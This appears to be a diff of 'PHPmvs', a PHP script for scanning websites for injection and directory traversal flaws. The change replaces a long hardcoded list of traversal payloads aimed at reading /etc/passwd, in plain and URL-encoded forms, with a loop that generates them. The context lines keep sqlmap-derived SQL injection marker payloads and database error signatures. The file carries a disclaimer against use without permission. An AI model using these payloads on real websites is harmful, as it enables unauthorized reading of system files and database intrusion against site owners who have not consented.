@@ -4,10 +4,22 @@ By Diego Cardenas "The Samedog" under the GNU GENERAL PUBLIC LICENSE Version 2, 
 Updating this just for the sake of it, versioning is not needed anymore so this will be called "PHPmvs" from now on.
 */
 $disclaimer = "Usage of this script for attacking websites WITHOUT permission of the owner is illegal. Developer is not responsible for any damage caused by this.";
-//ARRAYS AND SHIT YOOOOOOOO!!!
+
 //most queries are modded sqlmap generated queries http://sqlmap.sourceforge.net/
 set_time_limit(0);
 error_reporting(0);
+
+//common functions
+
+function char_looping($char,$end,$loops){
+	$return_string = "";
+	
+	for($x = 0; $x < $loops; $x++){
+		$return_string = $return_string.$char;
+		$return_array[] = $return_string.$end;
+	}
+	return $return_array;
+}
 
 //dummy queries to print ":oyu:" if the url is injectable.
 $payload_union   = "CONCAT(0x3a6f79753a,0x4244764877697569706b,0x3a70687a3a)";
@@ -80,57 +92,11 @@ $error_messages=array(
 	"p1"=>"PostgreSQL","p2"=>"pg_query","p3"=>"unterminated quoted string","p4"=>"pg_exec","p5"=>"PostgreSQL query failed:","p6"=>"not a valid PostgreSQL result"
 );
 
-//directory traversal array  *gotta make this into a loop too.*
-$dt = array(
-    '../etc/passwd',
-    '../../etc/passwd',
-    '../../../etc/passwd',
-    '../../../../etc/passwd',
-    '../../../../../etc/passwd',
-    '../../../../../../etc/passwd',
-    '../../../../../../../etc/passwd',
-    '../../../../../../../../etc/passwd',
-    '../../../../../../../../../etc/passwd',
-    '../../../../../../../../../../etc/passwd',
-    '../../../../../../../../../../../etc/passwd',
-    '../../../../../../../../../../../../etc/passwd',
-    '../../../../../../../../../../../../../etc/passwd',
-    '../../../../../../../../../../../../../../etc/passwd',
-    '../../../../../../../../../../../../../../../etc/passwd',
-    '../../../../../../../../../../../../../../../../etc/passwd',
-    '..%2Fetc%2Fpasswd',
-    '..%2F..%2Fetc%2Fpasswd',
-    '..%2F..%2F..%2Fetc%2Fpasswd',
-    '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
-    '..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
-    '..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
-    '..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
-    '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
-    '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
-    '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
-    '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
-    '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
-    '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
-    '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
-    '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
-    '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
-    '%2E%2E%2Fetc%2Fpasswd',
-    '%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
-    '%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
-    '%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
-    '%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
-    '%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
-    '%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
-    '%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
-    '%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
-    '%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
-    '%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
-    '%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
-    '%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
-    '%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
-    '%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
-    '%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd'
-);
+//directory traversal array
+
+
+$dt = array_merge(char_looping('../',"etc/passwd",10),char_looping('..%2F',"etc/passwd",10),char_looping('%2E%2E%2F',"etc%2Fpasswd",10 ));
+
 
 //admin panel common locations... array, i'm really thinking into remove this or maybe "deprecate" it.
 $ap = array(
@@ -493,6 +459,9 @@ switch (@$frame) {
 
 
 //--------------------------------------------------------------------------------------------------------------
+
+
+
 $string3 = ':oyu:'; //if this exist in the site, we have found the right injection URI.
 
 
